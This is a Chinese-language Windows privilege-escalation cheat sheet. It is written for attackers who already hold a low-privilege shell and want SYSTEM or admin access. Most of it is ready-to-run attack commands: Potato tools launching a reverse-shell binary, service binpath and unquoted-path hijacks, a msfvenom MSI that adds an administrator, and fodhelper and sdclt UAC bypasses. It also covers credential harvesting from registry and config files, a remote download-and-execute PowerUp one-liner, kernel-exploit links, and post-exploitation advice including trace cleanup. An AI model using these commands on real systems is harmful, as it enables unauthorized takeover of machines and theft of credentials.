# Windows 提权速记

## 0x01 概述

适用于已拿到 Windows 低权限 Shell（IIS 应用池用户、服务账户、普通本地用户），需要进一步提升到 `NT AUTHORITY\SYSTEM` 或本地管理员时的快速排查。常见提权路径：

- 特权令牌滥用：`SeImpersonatePrivilege` → Potato 家族，服务账户/IIS getshell 后首选。
- 配置错误：服务路径未加引号、弱服务 ACL、AlwaysInstallElevated、计划任务、自动登录。
- 凭证泄漏：unattend.xml、组策略缓存（GPP cpassword）、SiteList.xml、web.config。
- 补丁缺失：win32k.sys 系列内核漏洞（老系统重灾区）。

> 常用渗透命令见 [PEN-WinCmd](./PEN-WinCmd.md)，抓哈希与凭据导出见 [PEN-GetHash](./PEN-GetHash.md)。

## 0x02 提权信息枚举

### 1. 手工命令清单

```cmd
whoami /priv          # 关键！看 SeImpersonate/SeAssignPrimaryToken/SeBackupPrivilege
whoami /groups        # 是否在管理员组（UAC Bypass 的前提）
systeminfo            # 系统版本+补丁列表，用于补丁比对提权
net user              # 本地用户列表
net localgroup administrators
tasklist /svc         # 进程与服务的对应关系
wmic service get name,pathname,startmode   # 找未加引号的服务路径
icacls "C:\path"      # 检查目录/文件写权限
netstat -ano          # 端口与 PID 对应
qwinsta               # RDP/终端会话（会话劫持需 SYSTEM：tscon <ID> /dest:console）
```

`whoami /priv` 重点关注的权限：

- `SeImpersonatePrivilege` / `SeAssignPrimaryTokenPrivilege`：Potato 家族直接 SYSTEM。
- `SeBackupPrivilege`：读任意文件，可导出 SAM/SYSTEM 转储本地哈希。
- `SeDebugPrivilege`：注入/转储任意进程（含 lsass）。
- `SeLoadDriverPrivilege`：加载恶意内核驱动。

### 2. 自动化枚举工具

```cmd
:: winPEAS：全量枚举，红色标注高危项
winPEASx64.exe
winPEASx64.exe -quiet   # 只输出高危项，减少日志量

:: Seatbelt / SharpUp：C# 版快速体检，方便 exe/内存加载
Seatbelt.exe -group=all
SharpUp.exe audit
```

PowerUp.ps1（PowerSploit），一键跑完服务路径、服务 ACL、AlwaysInstallElevated、自动登录、GPP 等检查：

```powershell
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.10/PowerUp.ps1'); Invoke-AllChecks"
```

wesng（Windows-Exploit-Suggester-NG）：把 `systeminfo` 输出与公开 EXP 库比对，思路与手工补丁比对一致，详见 [PEN-WinCmd](./PEN-WinCmd.md) 的 `systeminfo 补丁比对提权` 小节：

```bash
# https://github.com/bitsadmin/wesng
systeminfo > sysinfo.txt
python wes.py sysinfo.txt
```

## 0x03 常见提权方向

### 1. Potato 家族（Service 账户首选）

原理：持有 `SeImpersonatePrivilege` 的账户（IIS 应用池、SQL Server 服务账户等）可借本地 NTLM 中继 + COM/RPCSS 滥用拿到 SYSTEM 令牌并模拟执行命令。这属于认证机制的设计缺陷而非内核漏洞，打了补丁仍可能有新变种。

判断：

```cmd
whoami /priv | findstr /i "Impersonate"
```

利用（按系统版本选型）：

```cmd
:: Win10 1809 / Server 2019 之前：JuicyPotato
JuicyPotato.exe -l 1337 -p c:\temp\rev.exe -t *
:: -l 本地监听端口 -p 要执行的程序 -t * 同时尝试两种令牌类型，-c 可指定 COM CLSID

:: Win10 1809+ / Server 2019–2022：GodPotato（官方声称支持 Win2012-2022）
GodPotato.exe -cmd "cmd /c c:\temp\rev.exe"

:: 多方式整合版：SweetPotato，自动尝试多种 Potato 原理
SweetPotato.exe -p c:\temp\rev.exe
```

家族速记：Rotten Potato（鼻祖）→ Juicy Potato（1809 前通用）→ Rogue/Lonely Potato（借外部 135 端口中继绕过限制）→ Sweet Potato（合集）→ God Potato（新系统通用）→ SharpEfsPotato / PrintNotifyPotato（EfsRpc、PrintNotify COM 中继变种）。

另外：`SeBackupPrivilege` 可直接读任意文件（diskshadow/robocopy 导 SAM、NTDS），利用细节见 [PEN-GetHash](./PEN-GetHash.md)。

### 2. 服务路径未加引号

原理：`C:\Program Files\Vuln Files\svc.exe` 不带引号时，Windows 会按 `C:\Program.exe`、`C:\Program Files\Vuln.exe`、`C:\Program Files\Vuln Files\svc.exe` 逐级尝试启动；哪一级目录可写就在哪一级放马。

判断：

```cmd
wmic service get name,pathname,startmode
:: 人工筛：路径含空格且首尾没有引号的服务
icacls "C:\Program Files\Vuln"
:: 输出中 (M)/(W)/(F) 授予 Users/Authenticated Users 组即可写
```

利用：

```cmd
copy rev.exe "C:\Program.exe"
:: 需服务以 SYSTEM 启动；机器重启或服务重启时触发
```

### 3. 服务 DLL 劫持 / 弱服务权限替换

原理分两类：一是服务二进制或其依赖 DLL 位于可写目录，直接替换；二是当前用户对服务配置有 `SERVICE_CHANGE_CONFIG` 权限，直接改 binPath 让服务帮我们执行命令。

判断：

```cmd
:: 服务二进制是否可写
icacls "C:\Program Files\Vuln\svc.exe"
:: 当前用户能改配置的服务（Sysinternals 工具，先接受EULA）
accesschk.exe /accepteula -uwcqv "当前用户名" *
```

利用（有服务配置修改权限时）：

```cmd
sc config VulnSvc binpath= "c:\temp\rev.exe"
:: 注意 binpath= 的等号后必须有空格，这是 sc 的经典坑
sc stop VulnSvc
sc start VulnSvc
```

DLL 替换类利用：用 Process Monitor 过滤 `NAME NOT FOUND`，找服务启动时搜索但缺失的 DLL，在服务目录放置恶意 DLL（导出函数需转发到原 DLL），重启服务生效。

### 4. AlwaysInstallElevated

原理：组策略开启 `AlwaysInstallElevated`（HKLM 与 HKCU 两处均为 1）后，任何用户以 SYSTEM 身份安装 MSI。

判断：

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

利用：

```cmd
:: 攻击机生成恶意 MSI（直接加管理员）
msfvenom -p windows/x64/exec CMD='net localgroup administrators test /add' -f msi -o shell.msi
:: 目标机静默安装
msiexec /quiet /qn /i c:\temp\shell.msi
```

### 5. 计划任务

原理：以 SYSTEM/管理员运行的任务若指向普通用户可写的程序或脚本，直接改写其内容。

判断：

```cmd
schtasks /query /fo LIST /v | findstr /i "TaskName Run As User Task To Run"
```

利用：

```cmd
icacls "C:\task\backup.bat"
:: 确认 (M)/(W)/(F) 后覆盖任务执行内容，等待下次触发
echo c:\temp\rev.exe > "C:\task\backup.bat"
```

### 6. 自动登录凭据

原理：开启自动登录的机器会把明文密码写进 Winlogon 注册表键，任何本地用户可读。

判断 + 利用：

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```

若密码属于管理员，直接 `runas /user:Administrator cmd` 或 RDP 复用登录。

### 7. 令牌窃取

原理：当前用户持有 `SeImpersonatePrivilege`/`SeDebugPrivilege` 且系统中存在 SYSTEM 令牌（运行中的进程或登录缓存）时，可直接窃取模拟，比 Potato 中继更直接。

meterpreter（incognito）：

```text
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"
getuid
```

PowerShell（PowerSploit）：

```powershell
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
```

### 8. UAC Bypass

前提：当前用户在管理员组，但进程令牌被 UAC 过滤（Medium Integrity），目标是绕过弹窗拿到 High Integrity 执行。

判断：

```cmd
whoami /groups | findstr /i "S-1-5-32-544"   # 在管理员组（即使是 Disabled 状态）
whoami /groups | findstr /i "Mandatory"      # Medium=被UAC过滤，High=已是完整管理员
```

利用（不同 Win10 版本逐一尝试，用完删除注册表键）：

```cmd
:: fodhelper：劫持 ms-settings 协议
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /d "c:\temp\rev.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /d "" /f
fodhelper.exe

:: computerdefaults：同样劫持 ms-settings，触发程序不同
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /d "c:\temp\rev.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /d "" /f
computerdefaults.exe

:: sdclt：劫持 Folder ProgID
reg add "HKCU\Software\Classes\Folder\shell\open\command" /ve /d "c:\temp\rev.exe" /f
reg add "HKCU\Software\Classes\Folder\shell\open\command" /v "DelegateExecute" /d "" /f
sdclt.exe /kickoffelev
```

### 9. DLL 劫持（应用目录 / PATH）

原理：程序按搜索顺序加载 `version.dll`、`dwmapi.dll`、`msvcp140.dll` 等系统 DLL，若应用安装目录或 PATH 中靠前的目录普通用户可写，放置恶意代理 DLL 即可随高权限进程执行。

判断：Process Monitor 过滤 `NAME NOT FOUND` + 目标进程，确认它先找应用目录且目录可写。

利用：

```cmd
icacls "C:\ProgramData\App"
:: 输出含 Users (M)/(W)/(F) 即可写
copy version.dll "C:\ProgramData\App\version.dll"
:: 恶意 DLL 需代理导出原函数，等管理员运行该应用
```

### 10. 凭据文件翻找

原理：装机与运维流程残留明文或"可解密"密码（SiteList/Groups 的 AES 密钥早已公开）。

```cmd
:: 无人值守安装与 sysprep 残留
findstr /i /s "password" C:\Windows\Panther\*.xml C:\Windows\System32\sysprep\*.xml
:: IIS 站点配置（数据库连接串）
findstr /i /s "connectionString" C:\inetpub\wwwroot\web.config
:: SCCM 站点列表（密码 AES 加密但密钥公开）
dir /s /b C:\SiteList.xml
:: 组策略缓存 cpassword（同样可解密）
findstr /s /i cpassword C:\Windows\SYSVOL\*.xml
```

GPP cpassword 解密（Kali）：

```bash
gpp-decrypt <cpassword的值>
# 或用 PowerSploit 的 Get-GPPPassword 模块
```

## 0x04 经典内核漏洞速查表

| 漏洞编号 | 别名 | 影响版本 | 一句话利用 |
| ---- | ---- | ---- | ---- |
| MS17-010 | EternalBlue 永恒之蓝 | Vista SP2 – Win10 1607（典型 Win7/2008R2） | SMBv1 远程溢出直接 SYSTEM，内网横向首选 |
| MS16-032 | Secondary Logon | Vista – Win10 1607 / Server 2008 – 2016 | 二次登录服务句柄滥用，PowerShell 版 EXP 直接弹 SYSTEM |
| MS16-135 | CVE-2016-7255 | Win10 1511/1607、Server 2016 RTM | win32k.sys 内核提权，PS 版 EXP |
| MS15-051 | CVE-2015-1701 | XP – Win8.1 / Server 2003 – 2012 R2 | win32k.sys 对象校验缺失，老系统保底 EXP |
| MS14-058 | CVE-2014-4113 | Server 2003 – Win8.1 / 2012 R2 | win32k.sys 内核提权，经典靶机常客 |
| CVE-2021-36934 | HiveNightmare / SeriousSAM | Win10 1809 – 21H1 | 卷影副本 ACL 错误，普通用户转储 SAM 本地哈希 |
| CVE-2021-1675/34527 | PrintNightmare | 几乎全版本（Spooler 开启即中招） | Print Spooler 任意加载 DLL，本地/远程 SYSTEM |

POC 与探测：

```bash
# MS17-010 打前先探测（445 端口）
nmap -p445 --script smb-vuln-ms17-010 <目标IP>
# 利用：MSF 模块 exploit/windows/smb/ms17_010_eternalblue
```

- MS17-010: https://github.com/SecWiki/windows-kernel-exploits （含 nmap 探测与 EXP）
- MS16-032: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032（PowerShell 版）
- MS16-135: https://github.com/FuzzySecurity/PSKernel-Primitives
- MS15-051 / MS14-058: SecWiki windows-kernel-exploits 同仓库收录
- HiveNightmare: https://github.com/GossiTheDog/HiveNightmare（运行即在本地转储 SAM/SYSTEM/SECURITY）
- PrintNightmare: https://github.com/calebstewart/CVE-2021-1675（impacket 版，本地/远程通吃）

内核 EXP 注意事项：

- 先 `systeminfo` 确认版本与补丁再选 EXP，选错可能蓝屏断掉唯一入口。
- 优先配置类提权，内核 EXP 兜底；利用成功后尽快迁移稳定进程。
- PrintNightmare 属于服务漏洞，不算内核漏洞，但常被归入提权速查。

## 0x05 提权后动作

一句话链路：提权成功 → 确认 SYSTEM → 抓本机凭证 → 横向移动。

```cmd
whoami    # nt authority\system 即成功
```

- 抓哈希/明文：mimikatz、impacket secretsdump，详见 [PEN-GetHash](./PEN-GetHash.md)。
- 横向移动：PTH、远程执行、域内攻击，详见 [PEN-Lateral](./PEN-Lateral.md)（横向移动篇）。
- 痕迹清理可参考 [PEN-WinClear](./PEN-WinClear.md)。

## 0x06 排查顺序建议

1. `whoami /priv`：有 SeImpersonate → 直接 Potato，最短路径。
2. `systeminfo` + wesng 补丁比对（见 [PEN-WinCmd](./PEN-WinCmd.md)）→ 匹配内核 EXP。
3. PowerUp `Invoke-AllChecks` 全量扫服务路径/服务 ACL/AlwaysInstallElevated/自动登录。
4. 在管理员组 → UAC Bypass。
5. 计划任务、可写目录、DLL 劫持。
6. 凭据翻找（unattend / GPP / web.config / SiteList）。
7. 都无果再上内核 EXP，先只读探测，避免一上来就高风险执行。

## 0x07 防御要点

- 服务最小权限运行：避免 LocalSystem 起不必要的服务，应用池/服务账户用受限账户或 gMSA。
- 服务路径一律加引号：`binPath= "C:\Program Files\Vuln\svc.exe"`，安装时规范写入。
- 补丁管理：内核提权基本靠补丁防，Win7/2008 等停服系统是重灾区。
- 禁用 AlwaysInstallElevated 策略（默认未启用，切勿开启）。
- SeImpersonate 最小化：IIS 应用池等默认持有，是 Potato 家族的前提，按业务收紧服务令牌。
- 无打印需求的服务器禁用 Print Spooler：`Set-Service Spooler -StartupType Disabled`。
- 装机/运维文件用后即删（unattend、sysprep），避免自动登录密码落盘；GPP 下发密码功能已被微软禁用，历史缓存要清理。

## Ref

- PowerSploit / PowerUp: https://github.com/PowerShellMafia/PowerSploit
- winPEAS: https://github.com/peass-ng/PEASS-ng
- LOLBAS（Windows 版 GTFOBins）: https://lolbas-project.github.io/
- SecWiki Windows 内核提权合集: https://github.com/SecWiki/windows-kernel-exploits
- HackTricks Windows 提权检查清单: https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html
- itm4n 的本地提权与 UAC Bypass 研究合集: https://itm4n.github.io/
